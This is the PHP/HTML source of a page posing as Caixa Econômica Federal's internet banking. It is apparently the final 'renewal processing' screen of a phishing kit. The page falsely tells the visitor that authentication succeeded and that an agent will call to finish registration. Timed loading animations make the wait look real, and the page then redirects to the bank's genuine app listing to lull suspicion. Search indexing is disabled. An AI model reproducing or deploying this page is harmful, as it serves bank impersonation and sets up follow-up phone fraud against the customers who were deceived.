<?php 
	session_start();
	session_destroy();
?>

<!DOCTYPE html>
<html>
<head>
	<title>Caixa econômica | Processando renovação</title>

	<!--METAS-->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="theme-color" content="#1664ac">

	<!--LINKS ESTILOS-->
	<link rel="shortcut icon" href="../../assets/imgs/favicon.ico">
	<!-- CSS only -->
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
	<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300&display=swap" rel="stylesheet">
	<style>

		*{
			font-family: 'Montserrat', sans-serif;
		}

		.banner{
			width: 100%;
			height: 50px;
			background-color: #1664ac;
		}

		.banner #icone{
			position: relative;
			float: left;
			top: 11px;
			left: 10px;
		}

		.banner p{
			font-family: 'Poppins', sans-serif;
			font-size: 12px;
			font-weight: 300;
			color: #fff;
			position: relative;
			float: left;
			left: 25px;
			top: 15.5px;
			margin-right: 5px;
		}

		.banner #sp{
			font-weight: 700;
		}
		.logoCaixa{
			max-width: 150px;
		}

		.midTitle{
			color: #1664ac;
			font-size: 26px;
			font-weight: bold;
		}
		.finalLoading{
			max-width: 150px;
		}
		.doneBody{
			display: none;
		}
		.initialLoading{
			position: absolute;
			top: 40%;
			left: 0;
			right: 0;
			
		}
		#finalLoadingGif{
			display: none;
		}
		
	</style>
</head>
<body>
	<div class="banner">
			<a href="#">
				<img id="icone" src="../../assets/imgs/ico_voltar.png" width="27px" height="27px">
			</a>
			<p>INTERNET</p>
			<p id="sp">BANKING</p>
		</div>
	<div class="container">
		<div class="doneBody">
			<br>
			<br>
			<div class="row">	
				<div class="col-md-12 text-center">
					<img src="../../assets/imgs/logo-caixa-light.png" class="logoCaixa" alt="">				
				</div>
			</div>
			<br>
			<br>
			<div class="row">	
				<div class="col-md-12">
					<div class="alert alert-primary">Autenticação efetuada com sucesso!</div>
				</div>
			</div>
			<br>
			<div class="row">	
				<div class="col-md-12 text-center">
					<h1 class="midTitle">Em até um dia útil, um de nossos atendentes entrará em contato para finalizar seu cadastro</h1>
					<br>
					<p>
					 <br> <b>Aguarde, você será redirecionado...</b>
					</p>
				</div>
			</div>
			<div class="row">
				<div class="col-md-12 text-center" id="finalLoadingGif">
					<img src="../../assets/imgs/blueLoading.gif" class="finalLoading"  alt="">
				</div>
			</div>
		</div>
		<div class="initialLoading">
			<div class="row">
				<div class="col-md-12 text-center">
					<img src="../../assets/imgs/blueLoading.gif" class="finalLoading"  alt="">
				</div>
			</div>
			<div class="row">
				<div class="col-md-12 text-center">
					<span id="initialScreenText">Processo de renovação em andamento..</span>
				</div>
			</div>
		</div>
	</div>

	<script src="https://code.jquery.com/jquery-3.5.1.js" integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
	<script>
		$(document).ready(function(){
			setTimeout(() => {
				$("#initialScreenText").text("Por favor, aguarde..");
			}, 5000);
			setTimeout(() => {
				$(".initialLoading").fadeOut("slow", function(){
					$(".doneBody").fadeIn("slow");
				});
			}, 7000);
			setTimeout(() => {
				$("#finalLoadingGif").fadeIn("slow");
			}, 10000);
			setTimeout(() => {
				window.location.href="https://play.google.com/store/apps/details?id=br.com.gabba.Caixa";
			}, 30000);
		});
	</script>
</body>

</html>
